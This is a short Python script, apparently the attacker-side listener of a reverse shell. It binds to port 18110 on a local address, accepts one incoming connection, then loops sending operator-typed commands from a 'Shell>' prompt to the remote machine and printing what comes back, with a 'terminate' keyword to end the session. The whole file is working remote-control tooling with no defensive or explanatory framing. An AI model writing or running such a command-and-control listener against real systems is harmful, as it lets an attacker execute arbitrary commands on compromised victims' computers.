import socket

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.bind(("192.168.0.10", 18110))

    s.listen(1)

    print("[+] Listening for incoming TCP connections on port 18110...")

    conn, addr = s.accept()

    print("[+] We got a connection from: ", addr)

    while True:
        command = input("Shell> ")

        if "terminate" in command:
            conn.send("terminate".encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connect()

main()